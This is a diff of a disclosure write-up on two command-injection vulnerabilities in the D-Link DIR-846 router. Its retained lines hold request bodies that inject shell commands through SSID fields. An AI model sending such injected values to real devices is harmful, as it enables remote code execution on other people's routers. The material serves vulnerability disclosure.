@@ -1,10 +1,9 @@
-### info of vulnerability
+# info of vulnerability
 There are remote RCE vulnerabilities in D-Link router due to invalid sanitization so attackers could execute arbitrary code. 
 
 Vulnerable targets include but are not limited to the lastest firmware versions of DIR-846(100A35)
 
-### trigger point
-#### First
+## First CVE-2019-17509
 The first vulnerable code is in file /squashfs-root/www/HNAP1/control/SetMasterWLanSettings.php.
 ```php
           ......
@@ -38,9 +37,9 @@ Connection: close
 {"SetMasterWLanSettings":{"wl(0).(0)_enable":"1","wl(0).(0)_ssid":"2.4'&&ifconfig>'/www/a.txt","wl(0).(0)_preshared_key":"aXJrZXJPZ2dNVEl6TkRVMk56Zz0=","wl(0).(0)_crypto":"aestkip","wl(1).(0)_enable":"0","wl(1).(0)_ssid":"5.0","wl(1).(0)_preshared_key":"aXJrZXJPZ2c=","wl(1).(0)_crypto":"none"}}
 ```
 After this request,you can see the results from `ifconfig` in a.txt
-![a.txt](https://github.com/dahua966/Routers-vuls/blob/master/DIR-846/a.jpg)
+![a.txt](a.jpg)
 
-#### Second
+## Second CVE-2019-17510
 The second vulnerable code is in file /squashfs-root/www/HNAP1/control/ SetWizardConfig.php.
 ```php
            ......
@@ -73,11 +72,3 @@ Connection: close
 
 {"SetWizardConfig":{"wl(1).(0)_ssid":"aaa&&touch /www/a.txt","wl(0).(0)_ssid":"aaa&&touch /www/a.txt"}}
 ```
-#### Acknowledgement
-Thanks to the partners who discovered the vulnerability together：
-
-Wei Xie
-
-Zhen-hua Wang
-
-En-Ze Wang
